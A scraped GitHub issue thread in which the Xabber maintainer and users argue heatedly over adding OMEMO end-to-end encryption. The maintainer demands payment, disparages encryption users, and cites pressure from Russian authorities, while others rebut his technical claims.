some plans to bring Xabber for Web to many desktop platforms with Electron framework. I have some plans for all these versions of Xabber to work seamlessly with one another, so you can pick up your conversation on phone after chatting on desktop. That what I want and what I'm paying developers for. What I don't want is OMEMO, it's worthless to me. And since I'm a bit out of spare money, I have to make Xabber a viable source of income, I have some Ideas how to do that, and OMEMO does not play into any of these ideas. If some of you want this feature badly, pay me a for development of it (we charge $3500 per developer man/month). If you are not willing - well, sorry, we serve only customers, not freeriders. I actually don't understand this desire for encryption. Some ejabberd developer recently said in email group that XMPP community is affected by severe crypto-cancer, and I fully agree with him. For most uses, OTR or OMEMO just gives user an illusion of safety, not really meaningful increase in it. If you want your messages to be safe, you can just run your own server, that's easy and rather cheap. Just be wary of certificate errors. TL,DR OMEMO is for junkies and crypto-nerds who pay us nothing, get lost, or pay. ",,False,False,540
xabber-android/redsolution/540/334997114,It's sad to hear that you have problems with the authorities. Don't let them oppress you if you didn't do anything wrong. On the other hand there are normal people - who don't use this to deal drugs - who just want their privacy to be protected and also have some convenience. That what's OMEMO is all about. ,,False,False,540
xabber-android/redsolution/540/334997840,"@friend convenience...  For me, convenience is using multiple devices, syncing history between them, making in searchable, etc. You can have all of that by running own server, that's not too hard or costly. And with OMEMO, once chat is encrypted, you cant' search it, you can't really sync it, etc. - and if you somehow can, then it means that you have an illusion of safety, not better safety. My endgoal for Xabber, is to make XMPP messaging as ubiquitous for instant messaging as email. But to fight Telegram or Whatsapp we need to bring a knife to a knife fight, and OMEMO is hardly that knife. I don't really mind it's addition to Xabber, but, well, someone better pay for it. Btw, OTR was added on precisely same terms - some guy from Moscow volunteered and paid for our initial expenses developing OTR encryption back in 2013 (or 2012? don't remember... ) I prefer to receive payments with bitcoin. Oh, if you ask me, integration to send bitcoin is more essential for Xabber than OMEMO. ",,False,False,540
xabber-android/redsolution/540/334998390,How do you come to this conclusion? With OMEMO and Message Carbons (XEP-0280) I can have encrypted chats synced to all my devices and on all devices I can search the chat history just fine. ,,False,False,540
xabber-android/redsolution/540/334999116,"@friend login from new device and try searching your history like you do on telegram. Client-side search is fail. Anyway, I don't mind you doing a PR with this functionality, we'll test it and accept it in project if it's done well. I don't get it why you all want me to work for free so you can have convenient OMEMO in your device. I don't need or want OMEMO, so I have very little incentive to pay for development of OMEMO. Isn't it fair to be paid by those who actually want it? Anyway you all have free alternatives. Also, message carbons is NOT sufficient to fully sync messages. You at least need to use an archive on server to catch up with those messages sent while you were offline (offline messages will not do if you had 2 devices offline- only one of them will receive offline messages, other will have nothing without archive). ",,False,False,540
xabber-android/redsolution/540/334999240,Nothing wrong with that. And I don't want to force your to do anything. Just want to challenge your assumption about OMEMO encryption. ,,False,False,540
xabber-android/redsolution/540/334999770,"@friend my assumption is that heavy lifting should be done by server (client-centristic mentality has already cost XMPP it's potential place as a mainstream messaging protocol). If server does not know contents of messages, it can't search it. Also, if you store ALL you history on device, instead of small portion of recent messages, well, if your device gets seized, guess what happens? all your history belongs to them, so much for 'security'. Better way would be having a trusted server and having just an immediate portion of your history on device, while accessing more distant history with PIN checked by server. But with this crypto-cancer in community it'll hardly happen anytime soon. (I'd order implementation of server-side search in Xabber in no time, if I had any server available that would support such feature) ",,False,False,540
xabber-android/redsolution/540/335019593,"Please keep to the facts  Your link about ""crypto cancer"" is about server-to-server SSL connections as far as I see. Also what drives users away according to the comment is spam. (That was taken out of context. Read ""Spam is a bigger problem that missing s2s encryption."" Actually as far as I understand the user replying meant In the XMPP community there is crypto cancer, because many people still do not want to use s2s encrypted messages.) So if you quote stuff, please make sure it fits into what you actually want to prove and don't twist the facts. As far as it goes the topic was not about e2e crypto at all. I feel like you have no (correct) information about OMEMO/how OMEMO works. In short OMEMO is far better than OTR. See this page.. TL;DR In contrast to OTR it actually allows you to use multiple devices, search your messages, send messages when the other is not online, etc. The thread model you describe in the last comment is solved very simple Encrypt your messages locally (i.e. full disk encryption). When the messages are stored on the server and someone gets your device, they can also just instantly download all the old messages. Saving (unencrypted) messages on servers only saves space and makes it easier for authorities to scan messages when they size a server. (Because if you use your own server, they could also size your server instead of your local device.)  TL;DR Only encryption helps. (whether it is FDE on the local device, or server or something like OMEMO)  What I agree with is that people can of course support you, if they want to have a good coverage of OMEMO clients and want this feature. Especially as it is not easy to implement. (You certainly need to find a library for it, as otherwise you can do too much wrong in the crypto.) So anyone who wants this feature, here is a BugBounty Xabber – Add support for OMEMO Encyrption Support it or use another client software, which already has OMEMO support. That are your choices. ",,False,False,540
xabber-android/redsolution/540/335068173,"@friend facts are  crypto-cancer has taken over all XMPP community, especially users who do not program anything themselves, they just want it for no real reason but their paranoia. It's not only about s2s connections, it's about 'let's encrypt everything'. That link is just one example of this. This thread is another. Dozens of frequent requests 'do us OMEMO' in our email is another. We'd do OMEMO if these requests were based on something more than endless moaning client-side search is fail, I tell you once again.  you do not read what I say above. Search for word PIN and read once more. Yes, server should be updated for such security model. But securing data on device is infinitely harder and less reliable than on server  OTR or OMEMO solves only one security problem - if you don't trust your chat provider, because the only real advantage it gives you over unencrypted messaging is that XMPP.org admin can read your messages. If you have your own server, this risk goes away. Yes, it requires some efforts to maintain server, but you want security or illusion of security? Unlocking your device without your consent is much easier than unlocking server. What is particularly hilarious with this XMPP crypto-cancer is that all these folks who email me about how essential is encryption for messaging usually email me via gmail.com TL;DR please, stop trying to convince us to implement OMEMO. We know what it is. We don't want it for now, because we have limited resources that we prefer to put on things we believe more important for Xabber. If you want us to divert resources it direction you want, we have commercial rates for such work. Thank you for your attention and interest in our project. ",,False,False,540
xabber-android/redsolution/540/335080649,"FWIW, not really unless you you chat only with people who have a account on the same server. Otherwise you don't know at which servers your messages end up. Also thhe argument ""if someone hacks your device, he has complete access to the chat history"" is also true for the server aka ""if someone hacks your server (or one of your chat partners), he has complete access to the chat history"" ",,False,False,540
xabber-android/redsolution/540/335091421,@friend prime audience for the use of end to end encryption (drug addicts) are far more likely to have their device seized than their server. ,,False,False,540
xabber-android/redsolution/540/335099500,"Thank you for the clear words. Then I know now that I don't have to wait for Xabber with OMEMO anymore and stay with Conversations, although I don't want to buy drugs at all. Consistently, you might want to take OTR out so that Xabber becomes useless for junkies and the authorities leave you alone. OTR is certainly also one of the functions for junkies that you don't need personally. After that, you could take care of a nice surface in peace. ",,False,False,540
xabber-android/redsolution/540/335107474,"@friend you know, every single junkie user I talked to said exactly the same. -D We certainly won't remove OTR functionality from Xabber - most likely we'll simply pull down  Xabber with OTR from Russian Google Play store. Our authorities are luckily not too interested in foreign drug dealers and addicts. Then we'll possibly provide a ""Xabber for Business"" version without encryption for our normal Russian users (all seventeen of them) And I'm not saying we won't ever support OMEMO - it's just not our first, second or third priority. Have you seen Xabber for Web? Creating a multi-platform chat app that works extremely well  for federated chat, everywhere - that's what we are truly aimed at. ",,False,False,540
xabber-android/redsolution/540/335110489,"The way you talk about your users makes me feel really sorry for you ( It feels like Xabber is really not the app I'd recommend to privacy aware users anymore. Neither because its encryption, nor the will of the devs to protect their users. I respect that decision though and will stop bothering you anymore ) ",,False,False,540
xabber-android/redsolution/540/335113350,"From xabber.com You should probably change that to reflect you actual ""priorities"". ",,False,False,540
xabber-android/redsolution/540/335113767,"@friend the only privacy-aware users we've encountered so far are junkies, drug dealers and encryption nerds like folks in this thread.  Nerds comprise maybe 1 or 2% of users who are interested in data protection. Any yes, I think you would talk even worse of our users if you did get to read contents of our inbox on support email. And I'm actually offended by your insinuations about our 'will of the devs to protect their users'. Luckily for us, we DON'T have any user data, and we clearly won't submit to installing backdoors or stuff to our app. However you CLEARLY don't understand dangers of such stance in Russia. Linkedin is already blocked in Russia because it refused authorities access to user's data. Facebook will be blocked too if it won't submit. Viber has submitted too, so... it's either you are working in Russia and providing info or being blocked. Company like mine can be instantly seized by armed police, computers taken away, property sealed, company instantly bankrupted, I get jailed. Courts and laws don't really function in Russia, I might very well be sentenced for 'organizing a darknet criminal network to sell drugs and weapons', all because some crypto-nerds want OMEMO. So we simply plan to put our users (even junkies, yes) out of danger to their data being compromised by pulling our app from our country play store. (and to think I've personally spent more than $150k to listen to this.... how cool is that?) ",,False,False,540
xabber-android/redsolution/540/335122901,@friend I pity your situation. Maybe just close the ticket and let it rest. The issuer doesn't seem to be interested in this any more. Other security aware users will probably choose different software. ,,False,False,540
xabber-android/redsolution/540/335124465,"@friend Sorry, I did not intend to offend you. I can imagine that your situation in russia is not the best. I just dislike the way you talk about your users and the fact, that you throw all people interested in crypto into one category labelled ""drug addicts"". This is exactly that kind of rhetoric, which might one day outlaw cryptography completely (""who has nothing to hide...""). Anyways I wish you the best for your future and the future of the project ) ",,False,False,540
xabber-android/redsolution/540/335132502,"@friend no, this ticket might as well remain. Just not top priority for us. We'll probably do it eventually, maybe even this year. Current priority - redesign (Xabber is going to look GREAT), proper push notifications support since ejabbed now supports it, THEN I'll possibly ask our devs to do OMEMO if I won't have more immediate ideas. @friend you too wouldn't like our users if you talked to them. Luckily for us, so far Xabber is popular only within Russian criminal underground, if we measure by inadequate help requests that are 85% in Russian (if you read them often, you can see person interested in drugs at a glance). If you read carefully, I was always referring to our Russian audience, not all encryption users. Well, some folks here who constantly push us to 'do us OMEMO now' irritate me a bit, but that's ok. So the rest of the world will be as fine as it was before, no changes will be made. I'd consider moving Xabber to another jurisdiction, but that's a matter of money. Maybe even transferring rights to FSF, though I don't know if they are interested in this. ",,False,False,540
xabber-android/redsolution/540/335134550,"Don't want to get too much offtopic, but does the FSF host Android applications? I only know of IceCat mobile... Excited to see the new Xabber design ) ",,False,False,540
xabber-android/redsolution/540/335174668,"Good idea. 👍 But I see it like @friend does. I think all users, who commented on this issue here are interested in having a private mesenger. I doubt that anyone here is a drug dealer. Your equation ""cares for privacy = drug dealer"" does not make sense, even if the authorities maybe urge you to think that. And as said, your statistics are not good (help requests are not a good sign to measure your whole user base; many people may not need any help) and you take numbers out of nowhere. I see that your situation is difficult and developing such a secure messenger is… well… maybe even dangerous. I seriously feel sorry for that. However, that does not change the fact that you – as a dev of an important FLOSS app – care for the privacy/security of your users, who you don't know (for the same reason; don't think you know them because some dumba**es mail you). You can say, we cannot do this for legal reasons, we need to move the company (etc.) to another country or similar things. That's okay and we all understand that, but your inner motivation is questionable from your statements you do here. And throwing false facts into the discussion does not help either… ",,False,False,540
xabber-android/redsolution/540/335213685," Thank you @friend for your open words and the time to answer here all these questions! I really appreciate that (Even if not anybody agrees with you on certain statements.)  Summary of that thread to avoid further confusion   Will there be soon or ever OTR support in Xabber by the core devs? Unsure. Why? Because it's not very high on their priority list. They focus on features they personally need/use or other things they are more interessted in. Nothing wrong with that imho, especially when their own money is involved. Is there a way to give it more priority? Yes!  stated, they are also happy to receive PRs for that. ",,False,False,540
xabber-android/redsolution/540/335218189,Everybody who wants to get started with that might want to take a look at this blogpost ) ,,False,False,540
xabber-android/redsolution/540/335401248,"@friend Unsure. You mean OMEMO, right? OTR was in Xabber for ages ",,False,False,540
xabber-android/redsolution/540/335595010,Talking about OTR (Why) Does it make a difference to you whether drug dealers encrypt with OTR or OMEMO? That does hardly matter… (So consequently you'd either have to remove OTR or may add OMEMO.) ,,False,False,540
xabber-android/redsolution/540/335712827,"We don't plan to remove OTR until we have something to replace it with. We might remove Xabber from russian users, so hopefully they'll switch to some other app and feds will stop being interested in us. And OMEMO just requires some work that we aren't really willing to do at this moment, since it'll likely just increase pressure on us. ",,False,False,540
xabber-android/redsolution/540/335768679,Yes. I mean OMEMO. fixed. Thx. ,,False,False,540
xabber-android/redsolution/540/336622211,"Amen. There is far too much demanding with no ""put your money where your mouth is"" [American idiom]. ",,False,False,540
xabber-android/redsolution/540/343692437,"Encryption is not a crime. If russian users or any terrorists group or nazis or any bad people uses whatsapp, no body can say that whatsapp is evil. we have a bigger issue than adding one more encryption protocol @friend ",,False,False,540
xabber-android/redsolution/540/343728995,"Oh, not this again. Xabber is not evil, and any app is not evil, but you know who is? FSB! (formerly known as KGB) To be clear, here is a breakdown of what we have from having OTR in Xabber  tons of help support requests from idiots who are clearly junkies and know NOTHING about XMPP, just install it because their supplier told them so and are pissed off because it's not as simple as Whatsapp visits from FSB operatives who coerce us into installing backdoors into Xabber so they can read chats that are supposed to be secure threads like this on GitHub zero revenue  Do you have any understanding how easy it is to get jailed in Russia if you cross FSB? So, please, go preach this 'encryption is not a crime' to someone else. We know it's not a crime, but in current situation our options are a bit limited  put backdoors into Xabber refuse to put backdoors into Xabber (and quite possibly get jailed, for, like, drug trade) remove Xabber from russian app store  Of these three, if things will get really heated, the only viable option for us is last one. ",,False,False,540
xabber-android/redsolution/540/343731956,"That would maybe be the easiest option. And clearly better than adding backdoors and getting jailed or so. I mean those who need it, could still install it from F-Droid or compile it by themselves. I wonder anyway why drug dealers would install that app. I mean using WhatsApp would maybe not be the worst choice for their threat model. ",,False,False,540
xabber-android/redsolution/540/343735201,"@friend whatsapp exposes phone numbers, and is also... kinda not really trusted among this group of users. Corporation behind whatsapp might very well start responding to requests to disclose user information including IP addresses and such. XMPP working over TOR has this threat reduced to nothing. ",,False,False,540
xabber-android/redsolution/540/364865400,"@friend yeah, elite. Maybe you'll volunteer to answer support requests from our russian users? ",,False,False,540
xabber-android/redsolution/540/378250815,You can achieve this locally using a rachet. Just encrypt messages using a rachet (new derived key every message) and only store the key for last X messages. Then have the original key to the first message be encrypted using PIN and a slow key derivation function (lots of iterations). ,,False,False,540
xabber-android/redsolution/540/394093213,You need to do encryption. It doesn't violate and laws. Its should be/must have. OMEMO is good technology and should be implemented. ,,False,False,540
xabber-android/redsolution/540/394101392,"@friend so many people here telling us what we should do. Unfortunately, they tend to forget to back their instructions with payment. ",,False,False,540
xabber-android/redsolution/540/394102167,Well… if you mean that serious (which I doubt wink ) you could setup a bountysource for this issue and collect money for it. I doubt though… that this really solves the initial legal problem that makes this issue staling. ,,False,False,540
xabber-android/redsolution/540/394154401,"@friend I'm very serious. When I tell Xabber developers what they should do today, I back my instructions with payment. I think it's fair that anyone who wants to give them instructions should too back it with payment. All by himself, owning responsibility for what he wants us to do. Why should someone on bountysource pay for what @friend wishes? ",,False,False,540
xabber-android/redsolution/540/394155584,"Bountysource does not work that way. Here is how it works  Anyone who wants this issue solved, pays in money there. When this issue is solved and you accept a PR (or implement it yourself) you can get the money from there.  So if you want to do that, just signup there, claim ownership over the account there and add a prominent link to the top of this issue. ",,False,False,540
xabber-android/redsolution/540/394157701,"@friend why should I care how Bountysource works? The one who wants issue solved is not me, but @friend . So HE can negotiate the price with us, raise money with whatever means he has, pay us and get the job done. ",,False,False,540
xabber-android/redsolution/540/394158075,"Not payment. I must ask my daugther first, she has made my xabber account, because I'm ill. ",,False,False,540
xabber-android/redsolution/540/394158343,"Can you restore my account? Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von rugk notifications@friend.com Datum 03.06.18  1328  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc Subscribed subscribed@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540) Why should someone on bountysource pay for what @friend wishes? Bountysource does not work that way. Here is how it works Anyone who wants this issue solved, pays in money there. When this issue is solved and you accept a PR (or implement it yourself) you can get the money from there. So if you want to do that, just signup there, claim ownership over the account there and add a prominent link to the top of this issue. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 \u003e Why should someone on bountysource pay for what @friend wishes?\r\n\r\nBountysource does not work that way. Here is how it works\r\n1. Anyone who wants this issue solved, pays in money there.\r\n2. When this issue is solved and you accept a PR (or implement it yourself) you can get the money from there.\r\n\r\nSo if you want to do that, just signup there, claim ownership over the account there and add a prominent link to the top of this issue.""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""rugk"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" } ",,False,False,540
xabber-android/redsolution/540/394158968,@friend see what you've done? ,,False,False,540
xabber-android/redsolution/540/394158758," Do not understand your emails. Please wait one week till my daughter come back, she'll say me, what you write. You have no help in German? Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von Andrew Nenakhov notifications@friend.com Datum 03.06.18  1407  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc Subscribed subscribed@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)  @friend why should I care how Bountysource works? The one who wants issue solved is not me, but @friend . So HE can negotiate the price with us, raise money with whatever means he has, pay us and get the job done. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 @friend why should I care how Bountysource works? The one who wants issue solved is not me, but @friend . So HE can negotiate the price with us, raise money with whatever means he has, pay us and get the job done.""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""Andrew Nenakhov"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" } ",,False,False,540
xabber-android/redsolution/540/394159122,@friend Dies ist nicht der richtige Ort für solche Supportanfragen ) This is not the right place for this kind of questions. ,,False,False,540
xabber-android/redsolution/540/394160145,"Generally speaking, this is a place to discuss developer problems, specifically implementing a new feature in this case. You do have a user problem. Please seek help from the Xabber Support Team, not on Github. Unfortunately you are kind of making it hard to follow the original topic of this discussion with your request. @friend Can you later delete this part of the discussion? ",,False,False,540
xabber-android/redsolution/540/394159826,"I speak about my xabber account, and you write about prices.I need xabber help to restore my account. I have cancel my xabber account by mistake.Thank you for your help, but you arenot right here.Heide Hemmelrath Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von Andrew Nenakhov notifications@friend.com Datum 03.06.18  1407  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc Subscribed subscribed@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)  @friend why should I care how Bountysource works? The one who wants issue solved is not me, but @friend . So HE can negotiate the price with us, raise money with whatever means he has, pay us and get the job done. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 @friend why should I care how Bountysource works? The one who wants issue solved is not me, but @friend . So HE can negotiate the price with us, raise money with whatever means he has, pay us and get the job done.""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""Andrew Nenakhov"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" } ",,False,False,540
xabber-android/redsolution/540/394160176,"@friend if you need our help with Xabber account, please email support@friend.com  This thread on Github is not for tech support. It's a place where crytonerds and cryptojerks try to coerce us to develop new functionality for our app so they could feel really safe from surveillance ",,False,False,540
xabber-android/redsolution/540/394160238,"@friend don't wanna delete it, it's the most amusing part of this thread! ",,False,False,540
xabber-android/redsolution/540/394160655,@friend I'm sure your daughter can help you ) Please show her our discussion afterwards ;) ,,False,False,540
xabber-android/redsolution/540/394160338,"I'm waiting for my daughter, she say me, what I can doWhy I can't restore my xabber account and where? I don't find it, that is the question. I have cancel it by mistake.That's all.Heide Hemmelrath Xabber name ( heideline) Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von Paul Schaub notifications@friend.com Datum 03.06.18  1431  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc heideline hm.hemmelrath@friend.com, Mention mention@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)  @friend Dies ist nicht der richtige Ort für solche Supportanfragen ) This is not the right place for this kind of questions. — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 @friend Dies ist nicht der richtige Ort für solche Supportanfragen )\r\nThis is not the right place for this kind of questions.""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""Paul Schaub"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" } ",,False,False,540
xabber-android/redsolution/540/394161779,"What a bunch of nonsense! Developers want money in advance for code they don't want to write, don't think it makes sense and aren't allowed to offer. Then they accuse their more interested customers for the mistakes of overtaxed noobs and find that funny. Why is this discussion not simply closed if you do not want to fulfil this desire for OMEMO? By the way, thanks to Liberapay I donate regularly for the further development of my xmpp client. However, this is another app that OMEMO already masters and does not abuse its users as junkies. So, what am I doing here? Waiting for Godot? Goodbye! ",,False,False,540
xabber-android/redsolution/540/394163276,"@friend earlier we differentiated users interested in encryption in two groups junkies and cryptonerds. However, recently we came to a conclusion that there is also a subset of users who should rather be called cryptojerks. Now, please leave our issue tracker. Forever. ",,False,False,540
xabber-android/redsolution/540/394162711," Don't know, how I come to your side, sorry. I want to restore my xmpp account in Xabber. I get no answer and must read and read and I do not understand.That's not my mistake, but a bad help menagement. Good by! Developer -) HmHB Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von Buntbart notifications@friend.com Datum 03.06.18  1516  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc heideline hm.hemmelrath@friend.com, Mention mention@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)  What a bunch of nonsense! Developers want money in advance for code they don't want to write, don't think it makes sense and aren't allowed to offer. Then they accuse their more interested customers for the mistakes of overtaxed noobs and find that funny. Why is this discussion not simply closed if you do not want to fulfil this desire for OMEMO? By the way, thanks to Liberapay I donate regularly for the further development of my xmpp client. However, this is another app that OMEMO already masters and does not abuse its users as junkies. So, what am I doing here? Waiting for Godot? Goodbye! — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 What a bunch of nonsense! Developers want money in advance for code they don't want to write, don't think it makes sense and aren't allowed to offer. Then they accuse their more interested customers for the mistakes of overtaxed noobs and find that funny. Why is this discussion not simply closed if you do not want to fulfil this desire for OMEMO? By the way, thanks to Liberapay I donate regularly for the further development of my xmpp client. However, this is another app that OMEMO already masters and does not abuse its users as junkies. So, what am I doing here? Waiting for Godot? Goodbye!""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""Buntbart"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" } ",,False,False,540
xabber-android/redsolution/540/394163732,@friend don't worry about that. Just send us email to support@friend.com with details of your account. ,,False,False,540
